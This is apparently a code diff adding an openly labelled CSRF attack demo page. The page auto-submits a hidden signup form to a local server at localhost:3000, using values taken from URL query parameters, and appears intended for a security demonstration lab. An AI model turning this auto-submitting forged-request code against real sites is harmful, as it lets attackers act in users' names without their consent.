@@ -1,0 +1,60 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>CSRF attacker demo</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body{font-family:Arial,Helvetica,sans-serif;padding:24px;background:#111;color:#eee}
+    .box{background:#0b1220;padding:18px;border-radius:8px;border:1px solid rgba(255,255,255,0.03)}
+    .muted{color:#98a6b3;font-size:13px}
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h3>CSRF attack demo (attacker origin)</h3>
+    <p class="muted">This page receives query params and auto-submits to <code>http://localhost:3000/signup</code>.</p>
+    <div id="status" class="muted"></div>
+  </div>
+
+<script>
+  // Attacker page auto-submits form with parameters passed via query string.
+  // Example: http://localhost:3001/csrf_attack.html?email=test@local&name=attacker&pw=abc123
+
+  const params = new URLSearchParams(location.search);
+  const email = params.get('email') || 'csrf-demo@local';
+  const name = params.get('name') || 'csrf-demo';
+  const pw = params.get('pw') || 'DemoPass123';
+
+  document.getElementById('status').textContent = 'Auto-submitting signup for: ' + email;
+
+  // Build and submit form
+  const form = document.createElement('form');
+  form.method = 'POST';
+  form.action = 'http://localhost:3000/signup';
+  form.style.display = 'none';
+
+  const add = (n,v) => {
+    const i = document.createElement('input');
+    i.name = n; i.value = v;
+    form.appendChild(i);
+  };
+  add('name', name);
+  add('email', email);
+  add('password', pw);
+  add('confirmPassword', pw);
+
+  document.body.appendChild(form);
+
+  // submit after a small delay so dashboard can open this page visually
+  setTimeout(()=> {
+    try {
+      form.submit();
+      document.getElementById('status').textContent = 'Form submitted to victim /signup (check server).';
+    } catch(e) {
+      document.getElementById('status').textContent = 'Submission failed: ' + e;
+    }
+  }, 600);
+</script>
+</body>
+</html>
